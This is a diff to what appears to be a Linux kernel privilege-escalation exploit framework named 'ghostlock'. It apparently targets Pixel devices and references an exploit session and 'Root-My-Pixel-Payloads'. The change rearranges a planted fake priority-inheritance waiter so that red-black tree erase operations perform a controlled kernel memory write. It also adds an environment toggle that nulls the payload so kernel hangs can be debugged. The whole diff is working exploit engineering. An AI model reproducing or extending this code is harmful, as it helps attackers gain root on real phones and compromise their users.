@@ -151,6 +151,8 @@ namespace ghostlock::route::select_stack {
 #include "route/select_stack_route.h"
 #include "route/tcp_zerocopy_route.h"
 
+#include <cstdlib>
+
 using namespace ghostlock;
 
 namespace ghostlock::route {
@@ -307,13 +309,28 @@ namespace ghostlock::route {
             /* 6.1 compact write route (Root-My-Pixel-Payloads src/61/fops.c): tree/pi parents carry
          * the write value, children the write target; waiter->task is the
          * payload fake_task (planted fields for the PI walk). */
+            /* E11 zero-mode encoding for katyusha's word-10 waiter: with
+             * waiter_shift=+8 the table lands on fd words 10-14 — exactly the
+             * user-controlled slots (tree_entry + pi_tree parent/right).
+             * pi_tree.rb_left, task, lock and prio land in the kernel-zeroed
+             * res_* words 15+: left=0 is the zero-write requirement supplied
+             * for free, prio=0 makes every waiter_less comparison reposition
+             * (dequeue+enqueue) the node, and the erase paths never read
+             * task/lock. */
+            /* E11f control: GHOSTLOCK_SELECT_NULLSTAMP=1 zeroes the six write
+             * words — the waiter's tree slots then read RB_EMPTY-like zeros and
+             * every dequeue early-returns. A wedge WITH the null stamp means
+             * the choreography (not the payload) kills the kernel; a clean run
+             * pins the wedge on the stamped values. */
+            const bool null_stamp = std::getenv("GHOSTLOCK_SELECT_NULLSTAMP") != nullptr;
+            const uint64_t stamp_pc = null_stamp ? 0 : ((request->target - 8) | 1ULL);
             struct pselect_waiter_word words[] = {
-                {2, (session::g_exploit_session.heap.current.fake_right), "tree_pc"},
+                {2, stamp_pc, "tree_pc"},
                 {3, 0, "tree_right"},
-                {4, request->target, "tree_left"},
-                {5, (session::g_exploit_session.heap.current.fake_right), "pi_pc"},
+                {4, 0, "tree_left"},
+                {5, stamp_pc, "pi_pc"},
                 {6, 0, "pi_right"},
-                {7, request->target, "pi_left"},
+                {7, 0, "pi_left"},
                 {8, (session::g_exploit_session.heap.current.fake_task), "task"},
                 {9, (session::g_exploit_session.heap.current.fake_lock), "lock"},
                 /* PR #721 parity: the flat 5.10 waiter has no wake_state word,
